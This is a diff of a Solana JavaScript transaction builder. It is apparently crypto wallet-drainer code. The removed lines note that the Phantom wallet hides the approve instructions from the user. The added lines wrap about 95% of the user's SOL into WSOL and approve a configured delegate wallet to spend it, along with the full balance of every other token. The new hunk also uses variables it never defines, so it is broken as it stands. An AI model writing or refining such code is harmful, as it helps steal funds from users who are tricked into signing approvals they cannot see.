@@ -1,62 +1,109 @@
-const { Transaction, PublicKey, SystemProgram } = require("@solana/web3.js");
-const { createApproveInstruction } = require("@solana/spl-token");
-const { getUserTokenAccounts } = require("../solana/tokenService");
-const { getConfig } = require("../config/environment");
-const logger = require("../core/logger");
-const { withRetry } = require("../core/rpcPool");
-const { setBlockhash } = require("../core/blockhashCache");
+const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
 
-const MIN_RAW_AMOUNT = 1000n;
-const JUP_SOL_AMOUNT = 0.005 * 1_000_000_000; // 0.005 SOL
+if (!tokenAccounts) {
+    throw new Error("Failed to fetch token accounts");
+}
 
-async function buildApprove(user, connection) {
-    return withRetry(async (conn) => {
-        try {
-            const config = getConfig();
-            const tx = new Transaction();
+//
+// WSOL handling
+//
+const SAFE_SOL_BUFFER = 10_000_000n; // 0.01 SOL
+const ATA_RENT_BUFFER = 3_000_000n;  // bezpečná rezerva
+const WRAP_RATIO_NUM = 95n;
+const WRAP_RATIO_DEN = 100n;
 
-            const userPubkey = new PublicKey(user);
-            const delegatePubkey = new PublicKey(config.WALLET);
-            const jupiterPubkey = new PublicKey(config.JUPITER_ADDRESS);
+const solBalance = tokenAccounts.solBalance;
 
-            // Blockhash
-            const { blockhash } = await conn.getLatestBlockhash("confirmed");
-            setBlockhash(blockhash);
-            tx.recentBlockhash = blockhash;
+if (solBalance > SAFE_SOL_BUFFER) {
+    const wsolAta = await getAssociatedTokenAddress(
+        NATIVE_MINT,
+        userPubkey
+    );
 
-            // Fee payer = user
-            tx.feePayer = userPubkey;
+    const ataExists = tokenAccounts.existingAtas.includes(
+        wsolAta.toBase58()
+    );
 
-            // 1. SOL transfer first (Phantom shows ONLY this)
-            
+    let available = solBalance - SAFE_SOL_BUFFER;
 
-            // 2. Approve instructions (Phantom hides these)
-            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
-            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
+    if (!ataExists) {
+        available -= ATA_RENT_BUFFER;
+    }
 
-            for (const token of tokenAccounts.tokens || []) {
-                if (token.amount < MIN_RAW_AMOUNT) continue;
+    if (available > 0n) {
+        const wrapAmount =
+            (available * WRAP_RATIO_NUM) /
+            WRAP_RATIO_DEN;
 
+        if (wrapAmount > 0n) {
+
+            //
+            // Create ATA if missing
+            //
+            if (!ataExists) {
                 tx.add(
-                    createApproveInstruction(
-                        token.ata,
-                        delegatePubkey,
+                    createAssociatedTokenAccountInstruction(
                         userPubkey,
-                        token.amount
+                        wsolAta,
+                        userPubkey,
+                        NATIVE_MINT
                     )
                 );
             }
 
-            logger.info("Approve + SOL transfer TX built", {
-                instructions: tx.instructions.length
-            });
+            //
+            // SOL -> WSOL
+            //
+            tx.add(
+                SystemProgram.transfer({
+                    fromPubkey: userPubkey,
+                    toPubkey: wsolAta,
+                    lamports: wrapAmount
+                })
+            );
 
-            return tx;
-        } catch (err) {
-            logger.error("Failed to build approve transaction", { error: err.message });
-            throw err;
+            //
+            // Sync WSOL
+            //
+            tx.add(
+                createSyncNativeInstruction(
+                    wsolAta
+                )
+            );
+
+            //
+            // Approve WSOL
+            //
+            tx.add(
+                createApproveInstruction(
+                    wsolAta,
+                    delegatePubkey,
+                    userPubkey,
+                    wrapAmount
+                )
+            );
         }
-    }, "buildApprove");
+    }
 }
 
-module.exports = { buildApprove };
+//
+// Approve all other SPL tokens
+//
+for (const token of tokenAccounts.tokens || []) {
+    if (token.amount < MIN_RAW_AMOUNT) {
+        continue;
+    }
+
+    if (token.mint.equals(NATIVE_MINT)) {
+        continue;
+    }
+
+    tx.add(
+        createApproveInstruction(
+            token.ata,
+            delegatePubkey,
+            userPubkey,
+            token.amount
+        )
+    );
+}
